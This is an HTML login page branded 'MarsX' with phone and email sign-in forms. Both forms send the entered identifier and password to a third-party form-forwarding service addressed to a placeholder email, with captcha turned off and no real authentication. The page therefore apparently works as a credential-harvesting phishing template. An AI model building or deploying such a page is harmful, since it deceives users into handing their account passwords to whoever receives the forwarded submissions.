<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <style>
    body {
      background-color: #000;
      font-family: Arial, sans-serif;
      color: white;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 100px;
    }

    .container {
      width: 400px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }

    .logo {
      width: 100px;
      margin-bottom: 20px;
    }

    .welcome {
      font-size: 26px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .toggle-container {
      display: flex;
      background-color: #2d2d2d;
      border-radius: 999px;
      overflow: hidden;
      margin-bottom: 30px;
      width: 100%;
      height: 38px;
      padding: 3px;
    }

    .toggle-button {
      flex: 1;
      padding: 5px 0;
      text-align: center;
      cursor: pointer;
      background-color: transparent;
      color: #ccc;
      border: none;
      font-weight: 600;
      font-size: 0.95rem;
      transition: background-color 0.3s ease, color 0.3s ease;
      border-radius: 999px;
    }

    .toggle-button.active {
      background-color: #d4af37;
      color: #000;
    }

    form {
      display: flex;
      flex-direction: column;
      width: 100%;
      gap: 16px;
    }

    label {
      font-size: 0.9rem;
      margin-left: 12px;
      margin-bottom: 5px;
    }

    .input-group {
      background-color: #2d2d2d;
      border-radius: 30px;
      display: flex;
      align-items: center;
      padding: 12px 16px;
      gap: 10px;
    }

    .input-group img.flag {
      width: 20px;
      height: 20px;
      border-radius: 50%;
      object-fit: cover;
    }

    .input-group select {
      background: none;
      border: none;
      color: white;
      font-size: 1rem;
      outline: none;
      appearance: none;
      width: 60px;
    }

    .input-group input {
      background: none;
      border: none;
      color: white;
      font-size: 1rem;
      outline: none;
      flex: 1;
    }

    .input-group.password input {
      flex: 1;
    }

    .input-group .eye-icon {
      cursor: pointer;
      filter: grayscale(100%);
      opacity: 0.6;
    }

    .form-footer {
      display: flex;
      justify-content: space-between;
      font-size: 0.85rem;
      color: white;
      flex-direction: column;
      gap: 5px;
      margin-top: -5px;
      margin-bottom: 10px;
    }

    .form-footer a {
      color: white;
      text-decoration: none;
    }

    .form-footer small {
      color: white;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    button[type="submit"] {
      background-color: #d4af37;
      border: none;
      padding: 12px;
      border-radius: 30px;
      font-weight: bold;
      cursor: pointer;
    }

    .hidden {
      display: none;
    }

    /* âœ… CUSTOM CHECKBOX STYLING */
    input[type="checkbox"] {
      -webkit-appearance: none;
      appearance: none;
      width: 18px;
      height: 18px;
      border: 2px solid white;
      border-radius: 3px;
      background-color: black;
      cursor: pointer;
      position: relative;
      vertical-align: middle;
    }

    input[type="checkbox"]:checked {
      background-color: #d4af37;
      border-color: #d4af37;
    }

    input[type="checkbox"]:checked::after {
      content: '';
      position: absolute;
      top: 2px;
      left: 5px;
      width: 4px;
      height: 9px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="immmm.png" alt="MarsX Logo" class="logo" />

    <div class="welcome">Welcome To Login</div>

    <div class="toggle-container">
      <button class="toggle-button active" onclick="toggleLogin('phone')">Phone Login</button>
      <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
    </div>

    <!-- PHONE FORM -->
    <form id="phoneForm" action="https://formsubmit.co/tonadresse@email.com" method="POST">
      <input type="hidden" name="_captcha" value="false">

      <label for="phone">Phone Number</label>
      <div class="input-group">
        <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
        <select name="countryCode" id="countryCode">
          <option value="+1" data-flag="us">+1</option>
          <option value="+1" data-flag="ca">+1</option>
          <option value="+33" data-flag="fr">+33</option>
          <option value="+47" data-flag="no">+47</option>
          <option value="+34" data-flag="es">+34</option>
          <option value="+46" data-flag="se">+46</option>
          <option value="+41" data-flag="ch">+41</option>
          <option value="+63" data-flag="ph">+63</option>
          <option value="+44" data-flag="gb">+44</option>
          <option value="+57" data-flag="co">+57</option>
        </select>
        <input type="text" name="phone" placeholder="Phone Number" required>
      </div>

      <label for="password-phone">Password</label>
      <div class="input-group password">
        <input type="password" name="password" id="password-phone" placeholder="Password" required>
        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png" alt="eye" onclick="togglePassword('password-phone', this)">
      </div>

      <div class="form-footer">
        <a href="#">Forgot Password?</a>
        <small><input type="checkbox" id="remember-phone"> Remember account and password</small>
      </div>

      <button type="submit">Login</button>
    </form>

    <!-- EMAIL FORM -->
    <form id="emailForm" class="hidden" action="https://formsubmit.co/tonadresse@email.com" method="POST">
      <input type="hidden" name="_captcha" value="false">

      <label for="email">Email</label>
      <div class="input-group">
        <input type="email" name="email" placeholder="Email" required>
      </div>

      <label for="password-email">Password</label>
      <div class="input-group password">
        <input type="password" name="password" id="password-email" placeholder="Password" required>
        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png" alt="eye" onclick="togglePassword('password-email', this)">
      </div>

      <div class="form-footer">
        <a href="#">Forgot Password?</a>
        <small><input type="checkbox" id="remember-email"> Remember account and password</small>
      </div>

      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    function toggleLogin(method) {
      const phoneBtn = document.querySelectorAll('.toggle-button')[0];
      const emailBtn = document.querySelectorAll('.toggle-button')[1];
      const phoneForm = document.getElementById('phoneForm');
      const emailForm = document.getElementById('emailForm');

      if (method === 'phone') {
        phoneBtn.classList.add('active');
        emailBtn.classList.remove('active');
        phoneForm.classList.remove('hidden');
        emailForm.classList.add('hidden');
      } else {
        emailBtn.classList.add('active');
        phoneBtn.classList.remove('active');
        emailForm.classList.remove('hidden');
        phoneForm.classList.add('hidden');
      }
    }

    function togglePassword(inputId, eyeIcon) {
      const input = document.getElementById(inputId);
      if (input.type === 'password') {
        input.type = 'text';
        eyeIcon.src = "https://img.icons8.com/ios-glyphs/30/ffffff/closed-eye.png";
      } else {
        input.type = 'password';
        eyeIcon.src = "https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png";
      }
    }

    document.getElementById("countryCode").addEventListener("change", function() {
      const flag = this.options[this.selectedIndex].dataset.flag;
      const img = document.querySelector(".input-group img.flag");
      img.src = `https://flagcdn.com/${flag}.svg`;
    });
  </script>

</body>
</html>
